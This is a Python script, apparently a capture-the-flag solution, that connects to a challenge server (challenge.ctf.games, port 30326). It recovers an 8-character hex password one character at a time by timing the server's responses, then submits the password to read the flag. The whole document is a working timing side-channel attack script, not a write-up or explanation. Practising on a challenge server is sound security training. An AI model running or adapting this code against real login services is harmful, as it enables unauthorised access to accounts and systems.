
import socket
import time
import string

HOST = 'challenge.ctf.games'  # Replace with the server's IP or hostname
PORT = 30326         # Replace with the correct port

PASSWORD_LEN = 8  # The password length in hexadecimal characters (4 bytes -> 8 hex digits)

def measure_time(s: socket.socket, guess: str) -> float:
    """
    Measures the time taken to check a password guess over an open socket connection.
    """
    start_time = time.time()
    s.sendall(guess.encode() + b'\n')  # Send the guess and ensure newline as input separator
    response = s.recv(1024)  # Read the server's response (we expect to get "Incorrect" back)
    end_time = time.time()
    return end_time - start_time, response.decode('ascii')  # Return the time taken and server's response

def find_password(s: socket.socket) -> str:
    """
    Finds the password by using a timing attack, measuring the server's response times
    and identifying the most likely correct password based on timing differences.
    """
    possible_chars = string.hexdigits.lower()[:16]  # hex characters: 0-9, a-f
    guessed_password = ''

    for position in range(PASSWORD_LEN):
        best_time = 0
        best_char = ''

        for char in possible_chars:
            # Guess for the current position, filling remaining positions with '0'
            guess = guessed_password + char + '0' * (PASSWORD_LEN - len(guessed_password) - 1)
            elapsed_time, _ = measure_time(s, guess)

            if elapsed_time > best_time:
                best_time = elapsed_time
                best_char = char

        guessed_password += best_char
        print(f"Guessed so far: {guessed_password}")

    print(f"Password found: {guessed_password}")
    return guessed_password

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))

        # Print server's welcome message (if any)
        initial_response = s.recv(1024)
        print(initial_response.decode('ascii'))

        # Perform the timing attack to find the password
        password = find_password(s)

        # Send the found password to retrieve the flag
        s.sendall(password.encode() + b'\n')  # Send the found password
        flag_response = s.recv(1024)  # Read the flag from the server
        print(flag_response.decode('ascii'))  # Print the flag

if __name__ == '__main__':
    main()